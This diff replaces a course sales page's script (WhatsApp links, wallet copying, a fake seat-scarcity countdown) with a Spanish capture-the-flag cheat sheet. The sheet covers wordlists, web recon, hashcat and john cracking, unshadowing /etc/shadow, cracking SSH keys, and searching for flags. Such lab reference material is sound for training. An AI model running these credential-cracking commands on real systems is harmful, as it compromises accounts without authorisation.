+        {p:"rockyou.txt — instalar (Kali/Parrot ya la trae comprimida)", code:`sudo apt install wordlists -y\nls /usr/share/wordlists/\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz`},
+        {p:"rockyou.txt — si no está, descargarla directo", code:`sudo mkdir -p /usr/share/wordlists\nsudo curl -L -o /usr/share/wordlists/rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n# o clonar un mirror en GitHub y descomprimir con gunzip/7z según el formato`},
+        {p:"SecLists — la colección más completa (dirs, params, usuarios, passwords)", code:`sudo apt install seclists -y\nls /usr/share/seclists/\n\n# si no está en apt:\ngit clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists`},
+        {p:"dirb / dirbuster — wordlists que ya vienen con la herramienta", code:`ls /usr/share/wordlists/dirb/\ncat /usr/share/wordlists/dirb/common.txt | wc -l`},
+        {p:"Generar una wordlist propia a partir de una página (cewl)", code:`cewl http://<IP> -d 2 -m 5 -w wordlist_custom.txt`},
+        {p:"Generar variaciones/mutaciones de una wordlist (crunch)", code:`crunch 6 8 -t @@@@%%%% -o wordlist_custom.txt   # patrón: letras+números\ncrunch 8 8 0123456789 -o pins.txt                # ej. PINs numéricos`},
+        {p:"Mutar una wordlist existente con reglas (útil junto a hashcat)", code:`hashcat --stdout rockyou.txt -r /usr/share/hashcat/rules/best64.rule > rockyou_mutada.txt`}
+      ]},
+      {h:"Reconocimiento web", blocks:[
+        {p:"whatweb — identificar tecnologías", code:`whatweb http://<IP>`},
+        {p:"nikto — escaneo de vulnerabilidades web conocidas", code:`nikto -h http://<IP>`},
+        {p:"Enumerar subdominios por DNS (si hay dominio)", code:`dnsenum <dominio>\nfierce --domain <dominio>`}
+      ]}
+    ]
+  },
+  {
+    id:"hashes", title:"🔓 Cracking de Hashes",
+    sections:[
+      {h:"Identificar el tipo de hash", blocks:[
+        {p:"hash-identifier / hashid", code:`hash-identifier\nhashid '<hash>'\nhashid -m '<hash>'   # -m muestra directo el modo de hashcat`}
+      ]},
+      {h:"hashcat — modos más comunes", blocks:[
+        {p:"MD5 / SHA1 / NTLM", code:`hashcat -m 0 hash.txt rockyou.txt      # MD5\nhashcat -m 100 hash.txt rockyou.txt    # SHA1\nhashcat -m 1000 hash.txt rockyou.txt   # NTLM`},
+        {p:"SHA256 / SHA512", code:`hashcat -m 1400 hash.txt rockyou.txt   # SHA256\nhashcat -m 1700 hash.txt rockyou.txt   # SHA512`},
+        {p:"bcrypt / /etc/shadow (sha512crypt)", code:`hashcat -m 3200 hash.txt rockyou.txt   # bcrypt\nhashcat -m 1800 hash.txt rockyou.txt   # sha512crypt (linux shadow)`},
+        {p:"ZIP / RAR / PDF protegidos", code:`hashcat -m 13600 hash.txt rockyou.txt  # zip\nhashcat -m 13000 hash.txt rockyou.txt  # rar5\nhashcat -m 10500 hash.txt rockyou.txt  # pdf`},
+        {p:"Con reglas (mutaciones típicas de passwords)", code:`hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`},
+        {p:"Modo fuerza bruta (sin wordlist)", code:`hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a`}
+      ]},
+      {h:"john the ripper", blocks:[
+        {p:"Crackeo básico con wordlist", code:`john --wordlist=rockyou.txt hash.txt\njohn --show hash.txt`},
+        {p:"Convertir formatos para john (zip, ssh, etc.)", code:`zip2john archivo.zip > hash.txt\nssh2john id_rsa > hash.txt\nunshadow /etc/passwd /etc/shadow > combined.txt\njohn combined.txt`}
+      ]},
+      {h:"Tips rápidos", blocks:[
+        {p:"Diferenciar largo/formato del hash a ojo", code:`# 32 chars hex   -> MD5\n# 40 chars hex   -> SHA1\n# 64 chars hex   -> SHA256\n# $1$...          -> MD5 crypt (linux)\n# $2a$/$2b$...    -> bcrypt\n# $6$...          -> sha512crypt (linux shadow)\n# aad3b435...:... -> NTLM (formato LM:NTLM)`}
+      ]}
+    ]
+  },
+  {
+    id:"flags", title:"🚩 Buscar Flags (HTB / THM)", 
+    sections:[
+      {h:"Ubicaciones típicas", blocks:[
+        {p:"Linux", code:`cat /home/*/user.txt\ncat /root/root.txt`},
+        {p:"Windows", code:`type C:\\Users\\*\\Desktop\\user.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt`}
+      ]},
+      {h:"Búsqueda por nombre", blocks:[
+        {p:"Linux", code:`find / -iname "*flag*" 2>/dev/null\nfind / -iname "*.txt" 2>/dev/null | grep -iE "user|root|flag"`},
+        {p:"Windows", code:`dir /s /b C:\\*flag*\ndir /s /b C:\\*user.txt*\n\nGet-ChildItem -Path C:\\ -Include *flag*,*user.txt*,*root.txt* -Recurse -ErrorAction SilentlyContinue`}
+      ]},
+      {h:"Por patrón de contenido (hash/UUID)", blocks:[
+        {p:"Linux", code:`grep -rE "[a-f0-9]{32}" / 2>/dev/null | grep -v "Binary file"\nfind / -type f -name "*.txt" -exec grep -lE "^[a-f0-9]{32}$" {} \\; 2>/dev/null`},
+        {p:"Windows (PowerShell)", code:`Select-String -Path C:\\Users\\*\\Desktop\\*.txt -Pattern "[a-f0-9]{32}"\nGet-ChildItem -Recurse -Include *.txt | Select-String -Pattern "[a-f0-9]{32}"`}
+      ]},
+      {h:"Flags ocultas", blocks:[
+        {p:"Permisos restringidos / rutas no estándar", code:`ls -la /root/\nls -la /home/*/\nfind / -iname "*.txt" 2>/dev/null\nfind / -type f -newermt "2024-01-01" 2>/dev/null | grep -v proc`}
+      ]},
+      {h:"Sherlocks / forense", blocks:[
+        {p:"Logs, DB, capturas", code:`grep -riE "flag\\{|FLAG\\{|HTB\\{" / 2>/dev/null\nfind / -iname "*.pcap" -o -iname "*.log" -o -iname "*.db" 2>/dev/null\ntshark -r archivo.pcap -Y "frame contains \\"flag\\""`}
+      ]}
+    ]
   }
+];
 
-  walletTabs.forEach((tab) => tab.addEventListener("click", () => showWallet(tab.dataset.wallet)));
+const main = document.getElementById('main');
+const filters = document.getElementById('filters');
+const q = document.getElementById('q');
 
-  const waUrl = (msg) => `https://wa.me/${WHATSAPP_CONFIG.phone}?text=${encodeURIComponent(msg)}`;
+function esc(s){return s.replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+function hl(s, term){
+  if(!term) return esc(s);
+  const re = new RegExp('('+term.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','ig');
+  return esc(s).replace(re, '<mark>$1</mark>');
+}
 
-  document.querySelectorAll("[data-wa]").forEach((el) => {
-    el.href = waUrl(el.dataset.waMsg || WHATSAPP_CONFIG.message);
-    el.target = "_blank";
-    el.rel = "noopener";
-    el.addEventListener("click", () => {
-      (window.dataLayer = window.dataLayer || []).push({ event: "whatsapp_click", wa_cta: el.dataset.wa });
+let activeSheet = 'all';
+
+filters.innerHTML = '<button data-id="all" class="active">todos</button>' +
+  DATA.map(s=>`<button data-id="${s.id}">${s.title.replace(/^\S+\s/,'')}</button>`).join('');
+
+filters.addEventListener('click', e=>{
+  if(e.target.tagName!=='BUTTON') return;
+  activeSheet = e.target.dataset.id;
+  [...filters.children].forEach(b=>b.classList.toggle('active', b===e.target));
+  render();
+});
+
+function render(){
+  const term = q.value.trim();
+  // mientras hay texto en el buscador, ignoramos la pestaña de categoría
+  // (si no, buscar "find" estando parado en "Windows" no mostraba nada)
+  const sheets = term
+    ? DATA
+    : DATA.filter(s => activeSheet==='all' || s.id===activeSheet);
+  let html = '';
+  let any = false;
+
+  sheets.forEach(sheet=>{
+    const secs = sheet.sections.map(sec=>{
+      const blocks = sec.blocks.filter(b=>{
+        if(!term) return true;
+        const haystack = (sec.h+' '+b.p+' '+b.code).toLowerCase();
+        const words = term.toLowerCase().split(/\s+/).filter(Boolean);
+        return words.every(w => haystack.includes(w));
+      });
+      if(!blocks.length) return '';
+      return {sec, blocks};
+    }).filter(Boolean);
+
+    if(!secs.length) return;
+    any = true;
+    html += `<div class="sheet"><div class="sheet-title">${sheet.title}</div>`;
+    secs.forEach(({sec, blocks})=>{
+      const openCls = term ? ' open' : '';
+      html += `<div class="sect${openCls}"><div class="sect-head" onclick="this.parentElement.classList.toggle('open')">
+        <h3>${hl(sec.h, term)}</h3><span class="car">▶</span></div><div class="sect-body">`;
+      blocks.forEach(b=>{
+        html += `<div class="block"><p>${hl(b.p, term)}</p>
+          <pre><button class="copy-btn" onclick="copyCode(this)">copy</button><code>${hl(b.code, term)}</code></pre></div>`;
+      });
+      html += `</div></div>`;
     });
+    html += `</div>`;
   });
 
-  showWallet("usdt");
+  main.innerHTML = any ? html : '<p class="empty">sin resultados — probá otro término</p>';
+}
 
-  document.querySelectorAll("[data-copy]").forEach((btn) => {
-    const label = btn.querySelector("[data-copy-label]");
-    const icon = btn.querySelector("[data-copy-icon]");
-    const original = label.textContent;
-    btn.addEventListener("click", async () => {
-      const text = document.querySelector(btn.dataset.copy).textContent.trim();
-      try {
-        await navigator.clipboard.writeText(text);
-      } catch {
-        const ta = Object.assign(document.createElement("textarea"), { value: text });
-        document.body.appendChild(ta);
-        ta.select();
-        document.execCommand("copy");
-        ta.remove();
-      }
-      (window.dataLayer = window.dataLayer || []).push({ event: "wallet_copy" });
-      label.textContent = "¡Copiada! Ahora envía US$10";
-      icon.textContent = "done";
-      setTimeout(() => { label.textContent = original; icon.textContent = "content_copy"; }, 2500);
-    });
+function copyCode(btn){
+  const code = btn.nextElementSibling.innerText;
+  navigator.clipboard.writeText(code).then(()=>{
+    btn.textContent = '✓'; btn.classList.add('done');
+    setTimeout(()=>{btn.textContent='copy'; btn.classList.remove('done');}, 1200);
   });
+}
 
-  const stickyBar = document.getElementById("sticky-cta");
-  const inView = new Set();
-  const observer = new IntersectionObserver((entries) => {
-    entries.forEach((e) => (e.isIntersecting ? inView.add(e.target) : inView.delete(e.target)));
-    stickyBar.classList.toggle("is-visible", inView.size === 0);
-  });
-  ["inicio", "pago", "cta-final"].forEach((id) => observer.observe(document.getElementById(id)));
-
-  document.querySelectorAll("[data-year]").forEach((el) => (el.textContent = new Date().getFullYear()));
-
-  const cuposOcupados = Math.min(10, Math.max(0, Number(CUPOS_OCUPADOS) || 0));
-  const cuposDisponibles = 10 - cuposOcupados;
-  const claseLlena = cuposOcupados >= 10;
-  const cuposLeft = document.getElementById("cupos-left");
-  const cuposMarks = document.getElementById("cupos-marks");
-  const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
-
-  if (cuposLeft) cuposLeft.textContent = String(cuposDisponibles);
-  if (cuposMarks) {
-    cuposMarks.setAttribute("aria-label", `Quedan ${cuposDisponibles} de 10 cupos`);
-    for (let i = 0; i < 10; i += 1) {
-      const mark = document.createElement("span");
-      mark.className = "cupo-mark";
-      cuposMarks.appendChild(mark);
-      if (i < cuposOcupados) {
-        const turnOn = () => mark.classList.add("is-on");
-        if (reduceMotion) turnOn();
-        else setTimeout(turnOn, 120 + i * 90);
-      }
-    }
-  }
-
-  const countdownWrap = document.getElementById("cupos-countdown-wrap");
-  if (claseLlena) {
-    countdownWrap?.classList.add("is-hidden");
-    document.getElementById("pasos-pago")?.classList.add("is-hidden");
-    document.getElementById("pago-otro")?.classList.add("is-hidden");
-    document.getElementById("clase-llena")?.classList.remove("is-hidden");
-    const stickyLabel = document.querySelector("[data-sticky-label]");
-    const stickyIcon = document.querySelector("[data-sticky-icon]");
-    if (stickyLabel) stickyLabel.textContent = "Próxima clase";
-    if (stickyIcon) stickyIcon.textContent = "campaign";
-  } else if (countdownWrap) {
-    const COUNTDOWN_KEY = "clase-countdown-end";
-    const sevenHours = 7 * 60 * 60 * 1000;
-    let endsAt = Number(localStorage.getItem(COUNTDOWN_KEY));
-    if (!endsAt) {
-      endsAt = Date.now() + sevenHours;
-      localStorage.setItem(COUNTDOWN_KEY, String(endsAt));
-    }
-    const clock = document.getElementById("cupos-countdown");
-    const paintClock = () => {
-      const left = Math.max(0, endsAt - Date.now());
-      const total = Math.floor(left / 1000);
-      const hh = String(Math.floor(total / 3600)).padStart(2, "0");
-      const mm = String(Math.floor((total % 3600) / 60)).padStart(2, "0");
-      const ss = String(total % 60).padStart(2, "0");
-      if (clock) clock.textContent = `${hh}:${mm}:${ss}`;
-      return left;
-    };
-    if (paintClock() > 0) {
-      const timer = setInterval(() => {
-        if (paintClock() <= 0) clearInterval(timer);
-      }, 1000);
-    }
-  }
-
-  const terminalLog = document.getElementById("terminal-log");
-  if (terminalLog && terminalLog.classList.contains("term-pending")) {
-    const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-    const typeInto = (el, text) => new Promise((resolve) => {
-      let i = 0;
-      el.classList.add("term-caret");
-      const step = () => {
-        el.textContent = text.slice(0, i);
-        if (i < text.length) {
-          i += 1;
-          setTimeout(step, 70);
-        } else {
-          el.classList.remove("term-caret");
-          resolve();
-        }
-      };
-      step();
-    });
-
-    const cmd = terminalLog.querySelector("[data-term-cmd]");
-    const finalCmd = terminalLog.querySelector("[data-term-final]");
-    const cmdText = cmd.textContent;
-    const finalText = finalCmd.textContent;
-    cmd.textContent = "";
-    finalCmd.textContent = "";
-
-    (async () => {
-      await wait(700);
-      await typeInto(cmd, cmdText);
-      await wait(400);
-      for (const row of terminalLog.querySelectorAll("[data-term-row]")) {
-        row.style.display = "grid";
-        await wait(380);
-      }
-      await wait(450);
-      await typeInto(finalCmd, finalText);
-      finalCmd.classList.add("term-caret");
-    })();
-  }
+q.addEventListener('input', ()=>{
+  // feedback visual: mientras se busca, marcamos "todos" como activo
+  // (la categoría real vuelve a aplicarse solo si se borra la búsqueda)
+  const term = q.value.trim();
+  [...filters.children].forEach(b=>b.classList.toggle('active', term ? b.dataset.id==='all' : b.dataset.id===activeSheet));
+  render();
+});
+render();
 </script>
 </body>
 </html>
-
